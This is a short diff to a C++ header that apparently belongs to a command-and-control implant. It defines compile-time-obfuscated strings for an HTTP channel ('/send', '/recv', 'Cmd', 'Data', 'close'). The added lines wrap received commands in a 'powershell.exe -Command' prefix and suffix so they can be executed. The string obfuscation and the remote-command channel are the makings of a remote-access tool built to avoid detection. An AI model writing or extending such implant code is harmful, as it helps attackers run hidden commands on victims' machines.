@@ -20,8 +20,10 @@ const METHOD Method = {(const wchar_t*)WOBF(L"GET"), (const wchar_t*)WOBF(L"POST
 static const wchar_t* headerKeyString = (const wchar_t*)WOBF(L"Content-Type: application/json");
 
 const URI uri{std::wstring(WOBF(L"/send")), std::wstring(WOBF(L"/recv"))};
-static const char* closeKeyWord = OBF("close");
-static const char* CmdKeyWord   = OBF("Cmd");
-static const char* dataKeyWord  = OBF("Data");
+static const char* closeKeyWord  = OBF("close");
+static const char* CmdKeyWord    = OBF("Cmd");
+static const char* dataKeyWord   = OBF("Data");
+static const char* prefixKeyWord = OBF("powershell.exe -Command \"& {");
+static const char* suffixKeyWord = OBF("}\"");
 
 #endif
